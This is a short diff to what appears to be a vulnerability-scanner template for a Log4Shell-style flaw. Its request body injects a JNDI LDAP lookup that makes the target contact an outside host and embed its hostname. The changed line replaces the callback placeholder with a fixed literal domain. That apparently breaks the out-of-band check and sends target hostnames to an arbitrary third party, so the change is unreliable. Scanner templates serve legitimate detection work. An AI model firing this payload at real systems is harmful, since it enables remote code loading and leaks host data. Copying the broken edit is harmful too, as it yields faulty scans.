@@ -35,7 +35,7 @@ http:
         X-Requested-With: XMLHttpRequest
         Content-Type: application/x-www-form-urlencoded
 
-        type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&bAjax=true
+        type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}&bAjax=true
 
     matchers-condition: and
     matchers:
